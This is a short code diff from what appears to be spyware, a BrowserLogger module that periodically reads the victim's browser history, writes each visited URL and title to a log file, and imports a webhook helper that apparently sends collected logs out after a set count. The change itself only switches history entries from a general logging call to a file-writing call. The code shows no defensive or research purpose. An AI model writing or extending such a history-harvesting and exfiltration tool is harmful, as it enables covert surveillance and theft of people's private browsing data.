@@ -2,7 +2,7 @@ import browserhistory
 import time
 
 from config import BROWSER_LOG_INTERVAL_SEC, BROWSER_LOGS_BEFORE_SEND
-from utils.logging_utils import log_info, log_error
+from utils.logging_utils import log_info, log_error, log_to_file
 from utils.webhook_utils import send_log_file
 from utils.file_utils import clear_log_file
 
@@ -19,7 +19,7 @@ class BrowserLogger:
         if browser_histroy:
             for browser, history in browser_histroy.items():
                 for search in history:
-                    log_info(
+                    log_to_file(
                         self.log_file, f"{search[2]}: {search[1]} ({search[0]})", "w"
                     )
     
